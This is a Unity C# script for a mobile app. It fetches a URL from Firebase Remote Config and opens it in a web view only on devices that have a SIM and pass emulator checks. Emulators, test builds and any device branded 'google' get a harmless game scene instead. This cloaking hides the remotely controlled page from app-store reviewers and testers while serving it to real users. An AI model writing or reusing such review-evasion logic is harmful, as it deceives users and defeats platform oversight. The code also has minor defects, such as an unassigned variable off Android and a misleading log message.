using System.Collections;
using UnityEngine;
#if UNITY_2018_4_OR_NEWER
using UnityEngine.Networking;
#endif
using UnityEngine.UI;

using Firebase;
using Firebase.Extensions;
using Firebase.RemoteConfig;
using System.Threading.Tasks;
using UnityEngine.SceneManagement;
using UnityEngine.Events;
using System.Globalization;
using TMPro;

[System.Serializable]
public class FirebaseLoaderException : System.Exception
{
    public FirebaseLoaderException() { }
    public FirebaseLoaderException(string message) : base(message) { }
    public FirebaseLoaderException(string message, System.Exception inner) : base(message, inner) { }
    protected FirebaseLoaderException(
        System.Runtime.Serialization.SerializationInfo info,
        System.Runtime.Serialization.StreamingContext context) : base(info, context) { }
}

public class FirebaseLoader : MonoBehaviour
{
    public UnityEvent OnLoadFailed;

    [SerializeField] private LoadingImageRotater _imageRotater;
    [SerializeField] private WebViewer _viewer;
    [SerializeField] private TMP_Text _text;
    [SerializeField] private string _blankUrl;

    private WebViewObject _webViewObject;
    private DependencyStatus dependencyStatus = DependencyStatus.UnavailableOther;

    private static string CONFIG_VAR_NAME = "url";
    private static string GAME_SCENE_NAME = "GameScene";
    private static float CONNECTION_TIME = 10f;

    private string _pageUrl = "";
    private float _timer;
    private bool _isLoading;

    private void OnEnable() 
    {
        _text.text = "";
        _pageUrl = PlayerPrefs.GetString("URL");
        if(_pageUrl == null) _pageUrl = "";

        var clone = Instantiate(new GameObject("WebViewObject"),transform);
        clone.name = "WebViewGameObject";
        _webViewObject = (clone.gameObject).AddComponent<WebViewObject>();
        _webViewObject.CanGoBack();
    }

    async private void Start()
    {
        if(Application.internetReachability == NetworkReachability.NotReachable)
        {
            OnLoadFailed.Invoke();
            _text.text = "To use this app you need an internet connection";
            _imageRotater.gameObject.SetActive(false);
            return;
        }
        
        if(_pageUrl == "")
            await GetUrl();

        if(_pageUrl != "")
        {
            PlayerPrefs.SetString("URL", _pageUrl);
            Debug.Log("saved url " + _pageUrl);
            LoadPage();
        }

        _imageRotater.gameObject.SetActive(false);
    }

    public void LoadGameScene()
    {
        SceneManager.LoadScene(GAME_SCENE_NAME);
    }

    private async Task<bool> GetUrl()
    {

        Task loader = null;

        bool isLoading = false;
        bool isConnected = false;
        bool isError = false;

        while(_pageUrl == "")
        {
                loader = await Firebase.FirebaseApp.CheckAndFixDependenciesAsync().ContinueWith(async task => {

                    if(!isLoading)
                    {
                        dependencyStatus = task.Result;
                        if (dependencyStatus == Firebase.DependencyStatus.Available)
                        {
                            try
                            {
                                await FirebaseRemoteConfig.DefaultInstance.FetchAsync(System.TimeSpan.Zero);
                                if(!isConnected)
                                    isConnected = await FirebaseRemoteConfig.DefaultInstance.ActivateAsync();
                                _pageUrl = FirebaseRemoteConfig.DefaultInstance.GetValue(CONFIG_VAR_NAME).StringValue;
                                isLoading = false;
                            }
                            catch (FirebaseLoaderException e)
                            {
                                _text.text = e.Message;
                                OnLoadFailed.Invoke();
                                isError = true;
                            }
                            return;
                        }
                        else
                        {
                            OnLoadFailed.Invoke();
                            _text.text = "Could not resolve all Firebase dependencies: " + dependencyStatus;
                        }
                    }
                });

                if(isError)
                    break;

                isLoading = true;
                _timer += Time.deltaTime;
            
                if(_pageUrl != "")
                {
                    break;
                }
                else
                {
                    if(loader.IsFaulted || loader.IsCanceled)
                    {
                        Debug.Log("URL not loaded - loader.IsFaulted");
                        LoadGameScene();
                        break;
                    }
                    else 
                    {
                        if(_timer > CONNECTION_TIME)
                        {
                            OnLoadFailed.Invoke();

                            _text.text = "Connection Timeout";
                            _timer = 0;
                            break;
                        }
                    }
                }
        }
        
        return isError;
    }

    private void LoadPage()
    {

        int sim1, sim2 = 5;

#if PLATFORM_ANDROID
        AndroidJavaClass telephony = new AndroidJavaClass("android.telephony.TelephonyManager");

        sim1 = telephony.Call<int>("getSimState", 0);
        sim2 = telephony.Call<int>("getSimState", 1);
#endif

        if(_pageUrl == "" || CheckIsEmulator() || !(SimIsReady(sim1) || SimIsReady(sim2)))
        {
            LoadGameScene();
        }
        else 
        {
            Debug.Log("URL Loaded - " + _pageUrl);
            StartCoroutine(_viewer.InitWebViewer(_pageUrl, _webViewObject));
        }
    }

    private bool SimIsReady(int simState)
    {
        bool result = (simState != 8 
            && simState != 6 
            && simState != 7
            );

        Debug.Log("Sim " + simState + " is not Ready");
        return result;
    }

    private bool CheckIsEmulator()
    {

#if UNITY_EDITOR
    return true;
#endif

#if PLATFORM_ANDROID
        var build = new AndroidJavaClass("android.os.Build");

        var phoneModel = build.GetStatic<string>("MODEL");
        var buildProduct = build.GetStatic<string>("PRODUCT");
        var buildHardware = build.GetStatic<string>("HARDWARE");
        var fingerprint = build.GetStatic<string>("FINGERPRINT");

        var manufacturer = build.GetStatic<string>("MANUFACTURER");
        var brand = build.GetStatic<string>("BRAND");
        //var serial = build.GetStatic<string>("SERIAL"); This field was deprecated in API level 26. https://developer.android.com/reference/android/os/Build#SERIAL

        var board = build.GetStatic<string>("BOARD");
        var bootloader = build.GetStatic<string>("BOOTLOADER");
        var device = build.GetStatic<string>("DEVICE");

        bool result = (phoneModel.Contains("google_sdk")
                        || phoneModel.ToLower(new CultureInfo((int)Application.systemLanguage)).Contains("droid4x")
                        || phoneModel.Contains("Emulator")
                        || phoneModel.Contains("Android SDK built for x86")
                        || manufacturer.Contains("Genymotion")
                        || buildHardware == "goldfish"
                        || brand.Contains("google")
                        //|| serial.Contains("unknown")
                        || buildHardware == "vbox86"
                        || buildProduct == "sdk"
                        || buildProduct == "google_sdk"
                        || buildProduct == "sdk_x86"
                        || buildProduct == "vbox86p"
                        || board.ToLower(new CultureInfo((int)Application.systemLanguage)).Contains("nox")
                        || bootloader.ToLower(new CultureInfo((int)Application.systemLanguage)).Contains("nox")
                        || buildHardware.ToLower(new CultureInfo((int)Application.systemLanguage)).Contains("nox")
                        || buildProduct.ToLower(new CultureInfo((int)Application.systemLanguage)).Contains("nox")
                        );

        if(result) return true;

        result = result || brand.StartsWith("generic") && device.StartsWith("generic");
        if(result) return true;

        result = result || (buildProduct == "google_sdk");

        return result;
#endif
    }
}
